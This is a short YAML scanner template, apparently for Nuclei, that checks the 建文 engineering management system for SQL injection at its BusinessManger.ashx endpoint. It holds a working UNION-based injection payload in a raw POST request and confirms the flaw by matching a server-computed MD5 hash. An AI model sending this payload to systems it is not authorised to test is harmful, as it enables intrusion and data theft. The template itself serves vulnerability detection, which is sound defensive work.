id: poc-yaml-justwin-businessmangere-sqli
info:
  name: 建文工程管理系统 businessMangere SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
variables:
  t1: "{{rand_int(100,999)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        POST /AppInterface/Business/BusinessManger.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=PrjType&content=%' and 1=2 union select 1,(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}')),3,32));-- a
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
